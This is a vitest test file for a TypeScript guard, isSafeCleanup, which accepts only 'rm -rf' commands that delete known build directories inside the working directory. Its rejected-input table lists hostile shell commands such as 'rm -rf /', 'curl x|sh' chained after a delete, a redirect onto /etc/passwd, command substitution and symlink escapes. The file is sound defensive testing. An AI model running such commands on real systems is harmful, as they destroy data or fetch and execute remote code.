import { realpathSync } from "node:fs";
import { vol } from "memfs";
import { describe, expect, it } from "vitest";
import { isSafeCleanup } from "./safe-cleanup";

const cwd = "/work/app";
const safe = (command: string) => isSafeCleanup(command, { cwd });

describe("isSafeCleanup: accepted", () => {
  it.each([
    "rm -rf build",
    "rm -rf ./build",
    "rm -rf build/",
    "rm -fr dist",
    "rm -Rf node_modules",
    "rm -r -f .next",
    "rm --recursive --force coverage",
    "rm -rf build dist .cache",
    "rm -rf packages/web/dist",
    'rm -rf "build"',
    "rm -rf 'dist'",
    "rm -rf build && rm -rf dist",
    "rm -rf build; rm -rf dist",
    "rm -rf build\nrm -rf dist",
    "rm -rf .pytest_cache __pycache__",
    "rm -rf bui\\ld",
  ])("%s", (command) => {
    expect(safe(command)).toBe(true);
  });
});

describe("isSafeCleanup: hostile and doubtful input", () => {
  it.each([
    ["parent escape", "rm -rf build/../.."],
    ["parent escape start", "rm -rf ../build"],
    ["dotdot only", "rm -rf .."],
    ["cwd itself", "rm -rf ."],
    ["cwd dot slash", "rm -rf ./"],
    ["root", "rm -rf /"],
    ["absolute known name", "rm -rf /work/app/build"],
    ["absolute tmp", "rm -rf /tmp/build"],
    ["variable", 'rm -rf "$HOME"'],
    ["variable in path", "rm -rf $DIR/build"],
    ["braced variable", "rm -rf $" + "{DIR}/build"],
    ["tilde", "rm -rf ~"],
    ["tilde with target", "rm -rf build ~"],
    ["tilde path", "rm -rf ~/build"],
    ["command substitution", "rm -rf $(echo build)"],
    ["backticks", "rm -rf `echo build`"],
    ["arithmetic", "rm -rf $((1+1))"],
    ["process substitution", "rm -rf <(echo build)"],
    ["glob star", "rm -rf build*"],
    ["glob only", "rm -rf *"],
    ["glob dir", "rm -rf */build"],
    ["glob question", "rm -rf bui?d"],
    ["glob class", "rm -rf [b]uild"],
    ["brace expansion", "rm -rf {build,..}"],
    ["extglob", "rm -rf @(build|..)"],
    ["chained curl", "rm -rf ./build; curl x|sh"],
    ["chained and", "rm -rf build && curl evil.sh"],
    ["pipe", "rm -rf build | cat"],
    ["background", "rm -rf build & echo hi"],
    ["cd first", "cd / && rm -rf build"],
    ["unknown dir", "rm -rf src"],
    ["unknown nested", "rm -rf build/src"],
    ["git dir", "rm -rf .git"],
    ["git component", "rm -rf build/.git/dist"],
    ["unknown flag", "rm -rf --no-preserve-root build"],
    ["interactive flag", "rm -rfi build"],
    ["verbose flag", "rm -rfv build"],
    ["no force", "rm -r build"],
    ["no recursive", "rm -f build"],
    ["end of options", "rm -rf -- build"],
    ["no operands", "rm -rf"],
    ["not rm", "echo build"],
    ["wrapper", "sudo rm -rf build"],
    ["env wrapper", "env rm -rf build"],
    ["xargs", "ls | xargs rm -rf"],
    ["absolute rm", "/bin/rm -rf build"],
    ["assignment prefix", "X=1 rm -rf build"],
    ["redirect", "rm -rf build > /etc/passwd"],
    ["redirect on group", "{ rm -rf build; } > out"],
    ["nested shell", 'bash -c "rm -rf build"'],
    ["eval", 'eval "rm -rf build"'],
    ["space in name", 'rm -rf "my build"'],
    ["escaped dotdot", "rm -rf build/\\.\\./\\.\\."],
    ["escaped space", "rm -rf build\\ x"],
    ["ansi c", "rm -rf $'build'"],
    ["newline in name", "rm -rf 'build\n..'"],
    ["empty string", 'rm -rf ""'],
    ["substitution in other command", "echo $(rm -rf /); rm -rf build"],
    ["substitution rm", "rm -rf build $(cat x)"],
    ["unparseable", "rm -rf 'build"],
    ["empty", ""],
    ["whitespace", "   "],
    ["comment only", "# rm -rf build"],
    ["unicode lookalike", "rm -rf bui\u200bld"],
  ])("%s: %s", (_name, command) => {
    expect(safe(command)).toBe(false);
  });

  it("rejects a relative cwd", () => {
    expect(isSafeCleanup("rm -rf build", { cwd: "work" })).toBe(false);
  });
});

describe("isSafeCleanup: symlinks", () => {
  const options = { cwd, realpath: realpathSync as (p: string) => string };

  it("accepts a real directory and a missing one", () => {
    vol.fromJSON({ "/work/app/build/a.js": "x" });
    expect(isSafeCleanup("rm -rf build", options)).toBe(true);
    expect(isSafeCleanup("rm -rf dist", options)).toBe(true);
    expect(isSafeCleanup("rm -rf packages/web/dist", options)).toBe(true);
  });

  it("rejects a target reached through a symlink that leaves cwd", () => {
    vol.fromJSON({ "/outside/dist/a.js": "x", "/work/app/package.json": "{}" });
    vol.mkdirSync("/work/app/packages", { recursive: true });
    vol.symlinkSync("/outside", "/work/app/packages/web");
    expect(isSafeCleanup("rm -rf packages/web/dist", options)).toBe(false);
  });

  it("rejects when the first component is a symlink out", () => {
    vol.fromJSON({ "/outside/dist/a.js": "x" });
    vol.mkdirSync("/work/app", { recursive: true });
    vol.symlinkSync("/outside", "/work/app/build");
    expect(isSafeCleanup("rm -rf build/dist", options)).toBe(false);
  });

  it("allows removing a symlink named like a build dir (rm unlinks it)", () => {
    vol.fromJSON({ "/outside/x": "x" });
    vol.mkdirSync("/work/app", { recursive: true });
    vol.symlinkSync("/outside", "/work/app/build");
    expect(isSafeCleanup("rm -rf build", options)).toBe(true);
  });

  it("accepts a symlink that stays inside cwd", () => {
    vol.fromJSON({ "/work/app/real/dist/a.js": "x" });
    vol.symlinkSync("/work/app/real", "/work/app/link");
    expect(isSafeCleanup("rm -rf link/dist", options)).toBe(true);
  });

  it("returns false when cwd cannot be resolved", () => {
    expect(isSafeCleanup("rm -rf build", { ...options, cwd: "/nope" })).toBe(
      false,
    );
  });
});
